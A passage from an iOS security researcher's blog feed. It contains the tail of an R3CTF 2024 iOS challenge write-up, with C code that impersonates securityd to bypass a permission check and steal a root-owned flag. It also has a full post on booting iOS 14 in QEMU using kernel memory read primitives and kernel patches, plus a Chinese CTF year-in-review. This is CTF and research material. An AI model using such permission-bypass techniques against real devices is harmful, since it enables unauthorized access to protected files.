reuse the port name.<br>We can create our own <code>securityd</code> message handling function and always return <code>0</code> to bypass the permission check.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> got = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// int got = 0;</span></span><br><span class="line"><span class="function"><span class="keyword">kern_return_t</span> <span class="title">SERVER_check_perm</span><span class="params">(<span class="keyword">mach_port_t</span> server_port, <span class="keyword">uint32_t</span> uid, <span class="keyword">const</span> <span class="keyword">char</span> *path)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;check permission for uid=%d path=%s\n&quot;</span>, uid, path);</span><br><span class="line">    got = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>And now we can keep registering the callback port and wait for the message from <code>fileviewerd</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (!got) &#123;</span><br><span class="line">    CLIENT_remove_callback(port);</span><br><span class="line">    usleep(<span class="number">100000</span>);</span><br><span class="line"></span><br><span class="line">    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;fake_securityd_port);</span><br><span class="line">    mach_port_extract_right(mach_task_self(),</span><br><span class="line">                            fake_securityd_port, MACH_MSG_TYPE_MAKE_SEND, &amp;listener_send_right, &amp;r);</span><br><span class="line">    CLIENT_register_callback(port, listener_send_right);</span><br><span class="line">    usleep(<span class="number">100000</span>);</span><br><span class="line">    <span class="keyword">dispatch_queue_main_t</span> <span class="built_in">queue</span> = dispatch_queue_create(<span class="string">&quot;queue&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">dispatch_source_t</span> source = dispatch_source_create(</span><br><span class="line">        DISPATCH_SOURCE_TYPE_MACH_RECV, fake_securityd_port, <span class="number">0</span>, <span class="built_in">queue</span>);</span><br><span class="line">    dispatch_source_set_event_handler(source, ^&#123;</span><br><span class="line">      dispatch_mig_server(source, MAX_MSG_SIZE, security_server);</span><br><span class="line">    &#125;);</span><br><span class="line">    dispatch_resume(source);</span><br><span class="line"></span><br><span class="line">    CLIENT_read_file(port, <span class="string">&quot;/var/jb/var/root/flag&quot;</span>);</span><br><span class="line">    usleep(<span class="number">100000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Then we can move the flag into our sandbox and change its permission</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CLIENT_move_file(port, <span class="string">&quot;/var/jb/var/root/flag&quot;</span>, [NSString stringWithFormat:@<span class="string">&quot;%@/flag&quot;</span>, [NSBundle mainBundle].bundleURL.path].UTF8String);</span><br></pre></td></tr></table></figure><p>And that’s it! We can now read the flag in our own sandbox.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;I authored two iOS pwning challenges in R3CTF 2024 a few weeks ago. This post is a write-up for the challenges.&lt;/p&gt;
&lt;h2 id=&quot;pwn0win-Forbi</summary>
      
    
    
    
    
    <category term="PWN" scheme="https://kpwnz.github.io/tags/PWN/"/>
    
    <category term="iOS" scheme="https://kpwnz.github.io/tags/iOS/"/>
    
    <category term="XNU" scheme="https://kpwnz.github.io/tags/XNU/"/>
    
  </entry>
  
  <entry>
    <title>Boot Newer iOS with QEMU Step by Step</title>
    <link href="https://kpwnz.github.io/2024/03/09/Boot-Newer-iOS-with-QEMU-Step-by-Step/"/>
    <id>https://kpwnz.github.io/2024/03/09/Boot-Newer-iOS-with-QEMU-Step-by-Step/</id>
    <published>2024-03-09T18:30:27.000Z</published>
    <updated>2024-03-12T03:20:53.626Z</updated>
    
    <content type="html"><![CDATA[<h1>Boot Newer iOS with QEMU Step by Step</h1><p>I decided to update <a href="https://github.com/KpwnZ/d22-qemu">my QEMU fork</a> to support newer iOS versions for security research and <s>some CTFs</s>. Just note down how I did it here.</p><h2 id="First-attempt">First attempt</h2><p>Build D22-QEMU and load the iOS 14 kernel and we got</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">./qemu-system-aarch64 -M d22-idevice,kernelcache=&#x27;ios14/kcache.patched&#x27;,devicetree=&#x27;ios14/dtre.bin&#x27;,ramdisk=&#x27;ios14/rdsk.dmg&#x27;,trustcache=&#x27;ios14/trustcache&#x27;,bootargs=&#x27;debug=0x14e kextlog=0xffff cpus=1 rd=md0 serial=2&#x27;,ram-size=&#x27;1073741824&#x27; \</span><br><span class="line">-d unimp,int -cpu max -serial mon:stdio -D ./qemu.log</span><br><span class="line">iBoot version: D22-QEMU loader</span><br><span class="line">Darwin Image4 Validator Version 3.1.0: Fri Oct 30 00:14:28 PDT 2020; root:AppleImage4-106.40.12~2113/AppleImage4/RELEASE_ARM64</span><br><span class="line">panic(cpu 0 caller 0xfffffff0080af660): Kernel data abort. at pc 0xfffffff008024f64, lr 0xfffffff008024f54 (saved state: 0xffffffe80260b5f0)</span><br><span class="line">  x0: 0xffffffe4cddbcbf0  x1:  0xfffffff00932cbe8  x2:  0x0000000000000000  x3:  0xffffffe80260b960</span><br><span class="line">  x4: 0x0000000000000007  x5:  0x0000000000000073  x6:  0x829f5c9941fe80a8  x7:  0x0000000000000630</span><br><span class="line">  x8: 0x0000000000000000  x9:  0xfffffff00774ada8  x10: 0xfffffff00774adb8  x11: 0x0000000000000001</span><br><span class="line">  x12: 0x00000000004a0000 x13: 0x00000000ffdfffff  x14: 0x0000000000000001  x15: 0x0003ffffff933789</span><br><span class="line">  x16: 0x0000000000004000 x17: 0xfffffff0073ac824  x18: 0xfffffff0080a1000  x19: 0xffffffe4cde8ba00</span><br><span class="line">  x20: 0xffffffe4cdf70680 x21: 0x0000000000000000  x22: 0xffffffe80260bab0  x23: 0x0000000000000009</span><br><span class="line">  x24: 0xfffffff0081bdee8 x25: 0xfffffff009300de8  x26: 0x0000000000000009  x27: 0x0000000000000009</span><br><span class="line">  x28: 0xfffffff009300de8 fp:  0xffffffe80260b9c0  lr:  0xfffffff008024f54  sp:  0xffffffe80260b940</span><br><span class="line">  pc:  0xfffffff008024f64 cpsr: 0x60400204         esr: 0x96000005          far: 0x0000000000000000</span><br></pre></td></tr></table></figure><p>Well although it paniked, it’s a good start at least the serial port is still working. Then let’s check the pc address</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__text:FFFFFFF008024F64 loc_FFFFFFF008024F64                    ; CODE XREF: sub_FFFFFFF008024D88+26C↓j</span><br><span class="line">__TEXT_EXEC:__text:FFFFFFF008024F64                                         ; sub_FFFFFFF008024D88+278↓j ...</span><br><span class="line">__TEXT_EXEC:__text:FFFFFFF008024F64                 LDR             X8, [X21] ; Load from Memory</span><br><span class="line">__TEXT_EXEC:__text:FFFFFFF008024F68                 LDR             X8, [X8,#0x138] ; Load from Memory</span><br><span class="line">__TEXT_EXEC:__text:FFFFFFF008024F6C                 MOV             X0, X21 ; Rd = Op2</span><br><span class="line">__TEXT_EXEC:__text:FFFFFFF008024F70                 MOV             X1, X20 ; Rd = Op2</span><br><span class="line">__TEXT_EXEC:__text:FFFFFFF008024F74                 BLR             X8      ; Branch and Link Register</span><br><span class="line">__TEXT_EXEC:__text:FFFFFFF008024F78                 MOV             X20, X0 ; Rd = Op2</span><br><span class="line">__TEXT_EXEC:__text:FFFFFFF008024F7C                 CBZ             X0, loc_FFFFFFF008024F90 ; Compare and Branch on Zero</span><br><span class="line">__TEXT_EXEC:__text:FFFFFFF008024F80                 LDR             X8, [X20] ; Load from Memory</span><br><span class="line">__TEXT_EXEC:__text:FFFFFFF008024F84                 LDR             X8, [X8,#0x20] ; Load from Memory</span><br><span class="line">__TEXT_EXEC:__text:FFFFFFF008024F88                 MOV             X0, X20 ; Rd = Op2</span><br><span class="line">__TEXT_EXEC:__text:FFFFFFF008024F8C                 BLR             X8      ; Branch and Link Register</span><br></pre></td></tr></table></figure><p>After some reversing, I found that that it’s nvram variable loading routine. But we didn’t load any nvram variable! In iOS 14, nvram data can be loaded to devicetree by iBoot</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">result = sub_FFFFFFF007FCE6F8(<span class="string">&quot;/chosen&quot;</span>, qword_FFFFFFF009301760, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line"><span class="keyword">if</span> ( result )</span><br><span class="line">&#123;</span><br><span class="line">  v3 = result;</span><br><span class="line">  v4 = (*(__int64 (__fastcall **)(__int64, <span class="keyword">const</span> <span class="keyword">char</span> *))(*(_QWORD *)result + <span class="number">328LL</span>))(result, <span class="string">&quot;nvram-proxy-data&quot;</span>);</span><br></pre></td></tr></table></figure><p>I am just too lazy to reverse the nvram stuff, but since it’s loaded to devicetree, we can dump it from a real device! Now let’s try to find the memory address of devicetree. Luckily, we have</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">xnu_boot_args</span> &#123;</span></span><br><span class="line"><span class="keyword">uint16_t</span>                Revision;                       <span class="comment">/* Revision of boot_args structure */</span></span><br><span class="line"><span class="keyword">uint16_t</span>                Version;                        <span class="comment">/* Version of boot_args structure */</span></span><br><span class="line"><span class="keyword">uint64_t</span>                virtBase;                       <span class="comment">/* Virtual base of memory */</span></span><br><span class="line"><span class="keyword">uint64_t</span>                physBase;                       <span class="comment">/* Physical base of memory */</span></span><br><span class="line"><span class="keyword">uint64_t</span>                memSize;                        <span class="comment">/* Size of memory */</span></span><br><span class="line"><span class="keyword">uint64_t</span>                topOfKernelData;        <span class="comment">/* Highest physical address used in kernel data area */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">XNU_Boot_Video</span>   <span class="title">Video</span>;</span>                          <span class="comment">/* Video Information */</span></span><br><span class="line"><span class="keyword">uint32_t</span>                machineType;            <span class="comment">/* Machine Type */</span></span><br><span class="line"><span class="keyword">void</span>                    *deviceTreeP;           <span class="comment">/* Base of flattened device tree */</span></span><br><span class="line"><span class="keyword">uint32_t</span>                deviceTreeLength;       <span class="comment">/* Length of flattened tree */</span></span><br><span class="line"><span class="keyword">char</span>                    CommandLine[<span class="number">256</span>];  <span class="comment">/* Passed in command line */</span></span><br><span class="line"><span class="keyword">uint64_t</span>                bootFlags;              <span class="comment">/* Additional flags specified by the bootloader */</span></span><br><span class="line"><span class="keyword">uint64_t</span>                memSizeActual;          <span class="comment">/* Actual size of memory */</span></span><br><span class="line">&#125; boot_args;</span><br></pre></td></tr></table></figure><p>Exactly what we need! And</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">PE_init_platform</span><span class="params">(<span class="keyword">boolean_t</span> vm_initialized, <span class="keyword">void</span> *args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DTEntry         entry;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>    size;</span><br><span class="line"><span class="keyword">void</span> * <span class="keyword">const</span>    *prop;</span><br><span class="line">boot_args      *boot_args_ptr = (boot_args *) args;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (PE_state.initialized == FALSE) &#123;</span><br><span class="line">page_protection_type = ml_page_protection_type();</span><br><span class="line">PE_state.initialized = TRUE;</span><br><span class="line">PE_state.bootArgs = boot_args_ptr;</span><br><span class="line">PE_state.deviceTreeHead = boot_args_ptr-&gt;deviceTreeP;</span><br><span class="line">PE_state.deviceTreeSize = boot_args_ptr-&gt;deviceTreeLength;</span><br><span class="line">PE_state.video.v_baseAddr = boot_args_ptr-&gt;Video.v_baseAddr;</span><br><span class="line">PE_state.video.v_rowBytes = boot_args_ptr-&gt;Video.v_rowBytes;</span><br><span class="line">PE_state.video.v_width = boot_args_ptr-&gt;Video.v_width;</span><br><span class="line">PE_state.video.v_height = boot_args_ptr-&gt;Video.v_height;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>With <a href="https://github.com/KpwnZ/Def1nit3lyN0tAJa1lbr3akTool">Def1nit3lyN0tAJa1lbr3akTool</a> we have kernel memory reading and writing primitives. Now we can dump the devicetree from a real iPhone X!</p><p>Def1nit3lyN0tAJa1lbr3akTool has libkrw installed, so we can use it with Python ctypes to access kernel memory</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">libkrw = CDLL(<span class="string">&#x27;/var/jb/usr/lib/libkrw.0.dylib&#x27;</span>)</span><br><span class="line">kread = libkrw.kread</span><br><span class="line">kread.argtypes = [c_uint64, c_void_p, c_uint64]</span><br><span class="line">data = c_uint64(<span class="number">0</span>)</span><br><span class="line">kread(<span class="number">0x4141414141414141</span>, byref(data), <span class="number">8</span>)</span><br></pre></td></tr></table></figure><p>then dump the devicetree</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">iPhone:~ root# hexdump -C -n 128 ./dtdump</span><br><span class="line">00000000  15 00 00 00 11 00 00 00  72 65 67 75 6c 61 74 6f  |........regulato|</span><br><span class="line">00000010  72 79 2d 6d 6f 64 65 6c  2d 6e 75 6d 62 65 72 00  |ry-model-number.|</span><br><span class="line">00000020  00 00 00 00 00 00 00 00  20 00 00 00 41 31 39 30  |........ ...A190|</span><br><span class="line">00000030  35 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |5...............|</span><br><span class="line">00000040  00 00 00 00 00 00 00 00  00 00 00 00 23 61 64 64  |............#add|</span><br><span class="line">00000050  72 65 73 73 2d 63 65 6c  6c 73 00 00 00 00 00 00  |ress-cells......|</span><br><span class="line">00000060  00 00 00 00 00 00 00 00  00 00 00 00 04 00 00 00  |................|</span><br><span class="line">00000070  02 00 00 00 41 41 50 4c  2c 70 68 61 6e 64 6c 65  |....AAPL,phandle|</span><br><span class="line">00000080</span><br><span class="line">iPhone:~ root#</span><br></pre></td></tr></table></figure><h2 id="Trust-me">Trust me</h2><p>We need to load trustcache, simply download it from ipsw and load it. Then add the address and size to devicetree and the kernel should be happy enough.</p><h2 id="Trapped-in-the-loop">Trapped in the loop</h2><p>Now kernel stuck at</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">AppleSSE::start called</span><br><span class="line">AppleSSE::start returning, result = 1</span><br><span class="line">AppleSEPKeyStore:321:0: starting (BUILT: Oct 30 2020 00:31:23)</span><br><span class="line">AppleSEPKeyStore:545:0: _sep_enabled = 1</span><br><span class="line">AppleCredentialManager: start: called, instance = &lt;ptr&gt;.</span><br><span class="line">ACMRM: _publishIOResource: AppleUSBRestrictedModeTimeout = 259200.</span><br><span class="line">AppleCredentialManager: start: initializing power management, instance = &lt;ptr&gt;.</span><br><span class="line">AppleCredentialManager: start: started, instance = &lt;ptr&gt;.</span><br><span class="line">AppleCredentialManager: start: returning, result = true, instance = &lt;ptr&gt;.</span><br><span class="line">AppleInterruptController::start: Num Shared Timestamps == 16</span><br><span class="line">virtual bool AppleARMLightEmUp::start(IOService *): starting...</span><br></pre></td></tr></table></figure><p>Trace it block by block, we found that it’s stuck at</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__text:FFFFFFF007FDB7F4                 SUB             SP, SP, #0x50 ; Rd = Op1 - Op2</span><br><span class="line">__text:FFFFFFF007FDB7F8                 STP             X24, X23, [SP,#0x40+var_30] ; Store Pair</span><br><span class="line">__text:FFFFFFF007FDB7FC                 STP             X22, X21, [SP,#0x40+var_20] ; Store Pair</span><br><span class="line">__text:FFFFFFF007FDB800                 STP             X20, X19, [SP,#0x40+var_10] ; Store Pair</span><br><span class="line">__text:FFFFFFF007FDB804                 STP             X29, X30, [SP,#0x40+var_s0] ; Store Pair</span><br><span class="line">__text:FFFFFFF007FDB808                 ADD             X29, SP, #0x40 ; Rd = Op1 + Op2</span><br><span class="line">__text:FFFFFFF007FDB80C                 STR             XZR, [SP,#0x40+var_38] ; Store to Memory</span><br><span class="line">__text:FFFFFFF007FDB810                 CBZ             X0, loc_FFFFFFF007FDB884 ; Compare and Branch on Zero</span><br><span class="line">__text:FFFFFFF007FDB814                 MOV             X19, X2 ; Rd = Op2</span><br><span class="line">__text:FFFFFFF007FDB818                 MOV             X21, X1 ; Rd = Op2</span><br><span class="line">__text:FFFFFFF007FDB81C                 MOV             X20, X0 ; Rd = Op2</span><br><span class="line">__text:FFFFFFF007FDB820                 STR             XZR, [SP,#0x40+var_38] ; Store to Memory</span><br><span class="line">__text:FFFFFFF007FDB824                 ADRP            X22, #qword_FFFFFFF009352CA0@PAGE ; Address of Page</span><br><span class="line">__text:FFFFFFF007FDB828                 LDR             X0, [X22,#qword_FFFFFFF009352CA0@PAGEOFF] ; Load from Memory</span><br><span class="line">__text:FFFFFFF007FDB82C                 BL              sub_FFFFFFF007FC6200 ; Branch with Link</span><br><span class="line">__text:FFFFFFF007FDB830                 CBZ             X19, loc_FFFFFFF007FDB844 ; Compare and Branch on Zero</span><br><span class="line">__text:FFFFFFF007FDB834                 ADR             X8, sub_FFFFFFF007FDB9C4 ; Load address</span><br><span class="line">__text:FFFFFFF007FDB838                 NOP                     ; No Operation</span><br><span class="line">__text:FFFFFFF007FDB83C                 ADD             X9, SP, #0x40+var_38 ; Rd = Op1 + Op2</span><br><span class="line">__text:FFFFFFF007FDB840                 STP             X8, X9, [X19,#0x10] ; Store Pair</span><br><span class="line">__text:FFFFFFF007FDB844</span><br></pre></td></tr></table></figure><p>the function is called by</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_FFFFFFF008330408</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  OSDictionary *v0; <span class="comment">// x20</span></span><br><span class="line">  __int64 v1; <span class="comment">// x19</span></span><br><span class="line">  __int64 v2; <span class="comment">// x0</span></span><br><span class="line"></span><br><span class="line">  v0 = IOService::resourceMatching(<span class="string">&quot;IORTC&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">  v1 = sub_FFFFFFF00834FFC4(v0, <span class="number">0x6FC23AC00</span>uLL, <span class="number">0LL</span>);</span><br><span class="line">  v2 = (v0-&gt;vtable-&gt;OSObject.release_1)(v0);</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">    v2 = (*(*v1 + <span class="number">40LL</span>))(v1);</span><br><span class="line">  <span class="keyword">return</span> sub_FFFFFFF007D5A4D4(v2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>We don’t have that yet, so simply patch it to return after entering the function.</p><h2 id="Shell-we-dance">Shell we dance?</h2><p>Now we can boot userland and launch bash but we can not input anything.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Thu Jan  1 00:00:00 1970 localhost com.apple.xpc.launchd[1] (com.apple.xpc.launchd.domain.system) &lt;Error&gt;: Failed to bootstrap path: path = /AppleInternal/Library/LaunchDaemons, error = 2: No such file or directory</span><br><span class="line">Thu Jan  1 00:00:00 1970 localhost com.apple.xpc.launchd[1] (com.apple.xpc.launchd.domain.system) &lt;Notice&gt;: exiting bootstrap mode</span><br><span class="line">Thu Jan  1 00:00:00 1970 localhost com.apple.xpc.launchd[1] (com.apple.xpc.launchd.domain.system) &lt;Notice&gt;: exiting ondemand mode</span><br><span class="line">bash-5.0#         </span><br></pre></td></tr></table></figure><p>after some debugging we can find that the FIQ handler was never called. That means there might be something wrong with our timer. Comparing the kernel of iOS 13 and iOS 14, I notice that</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__text:FFFFFFF007D05C00 loc_FFFFFFF007D05C00                    ; CODE XREF: sub_FFFFFFF007D05AB4+130↑j</span><br><span class="line">__text:FFFFFFF007D05C00                 MRS             X9, #0, c14, c1, #0</span><br><span class="line">__text:FFFFFFF007D05C04                 MOV             W10, #0xD</span><br><span class="line">__text:FFFFFFF007D05C08                 BFI             W10, W8, #4, #0x1C</span><br><span class="line">__text:FFFFFFF007D05C0C                 ORR             X8, X9, X10</span><br><span class="line">__text:FFFFFFF007D05C10                 MSR             #0, c14, c1, #0, X8</span><br><span class="line">__text:FFFFFFF007D05C14                 MOV             W8, #1</span><br><span class="line">__text:FFFFFFF007D05C18                 MSR             #3, c14, c2, #1, X8</span><br></pre></td></tr></table></figure><p>iOS 13 enables the physical timer while in iOS 14</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__text:FFFFFFF007B6708C                 STP             X9, XZR, [X8,#0x58] ; Store Pair</span><br><span class="line">__text:FFFFFFF007B67090                 MOV             W8, #1  ; Rd = Op2</span><br><span class="line">__text:FFFFFFF007B67094                 MSR             #3, c14, c3, #1, X8 ; Transfer Register to PSR</span><br><span class="line">__text:FFFFFFF007B67098                 MOV             W8, #2  ; Rd = Op2</span><br><span class="line">__text:FFFFFFF007B6709C                 MSR             #3, c14, c2, #1, X8 ; Transfer Register to PSR</span><br></pre></td></tr></table></figure><p>It enables the virtual timer, thus</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qdev_connect_gpio_out(cpudev, GTIMER_VIRT, qdev_get_gpio_in(cpudev, ARM_CPU_FIQ));</span><br></pre></td></tr></table></figure><p>that is all we need! And we can unpatch the <code>IORTC</code> hack. Now we have an interactive shell!</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bash-5.0# uname -a</span><br><span class="line">Darwin localhost 20.1.0 Darwin Kernel Version 20.1.0: Fri Oct 30 00:34:17 PDT 2020; root:xnu-7195.42.3~1/RELEASE_ARM64_T8015 iPhone10,3 arm64 D22AP Darwin</span><br><span class="line">bash-5.0# sw_vers</span><br><span class="line">ProductName:    iPhone OS</span><br><span class="line">ProductVersion: 14.2</span><br><span class="line">BuildVersion:   18B92</span><br><span class="line">bash-5.0# id</span><br><span class="line">uid=0(root) gid=0(wheel) groups=0(wheel)</span><br><span class="line">bash-5.0#</span><br></pre></td></tr></table></figure><h2 id="Conclusion">Conclusion</h2><p>Ah, time to add iOS 16 support.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;Boot Newer iOS with QEMU Step by Step&lt;/h1&gt;
&lt;p&gt;I decided to update &lt;a href=&quot;https://github.com/KpwnZ/d22-qemu&quot;&gt;my QEMU fork&lt;/a&gt; to suppor</summary>
      
    
    
    
    
    <category term="iOS" scheme="https://kpwnz.github.io/tags/iOS/"/>
    
    <category term="QEMU" scheme="https://kpwnz.github.io/tags/QEMU/"/>
    
    <category term="Security" scheme="https://kpwnz.github.io/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>鼠鼠一事无成之2023</title>
    <link href="https://kpwnz.github.io/2023/12/30/2023/"/>
    <id>https://kpwnz.github.io/2023/12/30/2023/</id>
    <published>2023-12-31T06:15:03.000Z</published>
    <updated>2023-12-31T11:38:54.386Z</updated>
    
    <content type="html"><![CDATA[<h1>鼠鼠一事无成之2023</h1><h2 id="CTF">CTF</h2><h3 id="线上">线上</h3><p>D^3CTF 打了；justCTF 打了；UIUCTF 打了；SCTF 打了；*CTF 打了；WMCTF 打了；SekaiCTF 打了；MapleCTF 打了；Balsn CTF 打了；N1CTF 打了；ACTF 打了；0CTF 打了。还有很多没记的，打了。</p><h3 id="线下">线下</h3><p>桂林去了；合肥去了；ycb去了。S1uM4i 的家人们见了。爽。再多搞点线下旅游。</p><h2 id="洞">洞</h2><p>一个屁用没有之 OOB read 和几个不痛不痒之 NULL dereference，没了。</p><h2 id="上学">上学</h2><h3 id="本科鼠">本科鼠</h3><p>纯混，在床上躺的时间比上课的还多，没了。</p><h3 id="研究鼠">研究鼠</h3><p>在搞跟 JIT 有关的东西，也不知道成不成全靠组里的各位大哥，各位👴带带，有无 SpiderMonkey 哥教一下。</p><p>特别记录，如果你为了去往你所认为的天堂那多半会翻车，但是如果是为了逃离某些东西一般会有好结果。</p><h2 id="工作">工作</h2><p>找不到。</p><h2 id="其他">其他</h2><p>谢谢 W4terDr0p 的家人们让本鼠有机会跟校队一起打比赛，谢谢 S1uM4i 的家人们让本鼠有机会混点排名，谢谢 r3kapig 的家人们让本鼠见见世面。2024, keep hacking!</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;鼠鼠一事无成之2023&lt;/h1&gt;
&lt;h2 id=&quot;CTF&quot;&gt;CTF&lt;/h2&gt;
&lt;h3 id=&quot;线上&quot;&gt;线上&lt;/h3&gt;
&lt;p&gt;D^3CTF 打了；justCTF 打了；UIUCTF 打了；SCTF 打了；*CTF 打了；WMCTF 打了；SekaiCTF 打了；MapleC</summary>
      
    
    
    
    
    <category term="No pwn no life" scheme="https://kpwnz.github.io/tags/No-pwn-no-life/"/>
    
  </entry>
  
  <entry>
    <title>From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF</title>
    <link href="https://kpwnz.github.io/2023/10/23/iOS-Userland-Exploitation-pwn1OS-in-N1CTF/"/>
